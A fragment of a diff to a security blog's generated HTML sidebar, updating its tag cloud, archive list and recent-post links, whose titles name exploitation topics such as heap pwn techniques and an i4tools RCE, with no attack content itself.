rel="tag">问题</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AppleInternal/" rel="tag">AppleInternal</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOCCHI-THE-ROCK/" rel="tag">BOCCHI THE ROCK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-file/" rel="tag">IO_file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">_IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILEt/" rel="tag">_IO_FILEt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/malloc-hook/" rel="tag">_malloc_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/diags/" rel="tag">diags</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dirsearch/" rel="tag">dirsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastbin/" rel="tag">fastbin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-leak/" rel="tag">git leak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/header/" rel="tag">header</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap-feng-shui/" rel="tag">heap_feng_shui</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iDevice/" rel="tag">iDevice</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/match/" rel="tag">match</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/one-gadget/" rel="tag">one_gadget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/root/" rel="tag">root</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/safe-linking/" rel="tag">safe-linking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stdout/" rel="tag">stdout</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uaf/" rel="tag">uaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/" rel="tag">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" rel="tag">世界杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="tag">数据泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" rel="tag">问题</a></li></ul>
     </div>
   </div>
 
@@ -1331,7 +1353,7 @@ show(<span class="hljs-number">1</span>)
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/0day/" style="font-size: 10px;">0day</a> <a href="/tags/2025/" style="font-size: 10px;">2025</a> <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/PHP/" style="font-size: 11.67px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 11.67px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/match/" style="font-size: 10px;">match</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unauthorized/" style="font-size: 10px;">unauthorized</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 11.67px;">反序列化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+      <a href="/tags/0day/" style="font-size: 10px;">0day</a> <a href="/tags/2025/" style="font-size: 10px;">2025</a> <a href="/tags/AppleInternal/" style="font-size: 10px;">AppleInternal</a> <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/PHP/" style="font-size: 11.67px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/diags/" style="font-size: 10px;">diags</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 11.67px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/iDevice/" style="font-size: 10px;">iDevice</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/match/" style="font-size: 10px;">match</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unauthorized/" style="font-size: 10px;">unauthorized</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 11.67px;">反序列化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
     </div>
   </div>
 
@@ -1340,7 +1362,7 @@ show(<span class="hljs-number">1</span>)
   <div class="widget-wrap">
     <h3 class="widget-title">Archiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">九月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/02/">二月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">九月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li></ul>
     </div>
   </div>
 
@@ -1351,6 +1373,10 @@ show(<span class="hljs-number">1</span>)
     <h3 class="widget-title">letzter Beitrag</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2026/02/18/%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/">关于Apple产品的无diags修改Syscfg分区</a>
+          </li>
         
           <li>
             <a href="/2026/01/28/i4tools-unauthorized-RCE/">i4tools unauthorized RCE</a>
@@ -1366,10 +1392,6 @@ show(<span class="hljs-number">1</span>)
         
           <li>
             <a href="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/">2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup</a>
-          </li>
-        
-          <li>
-            <a href="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/">Windows RPC 初探</a>
           </li>
         
       </ul>
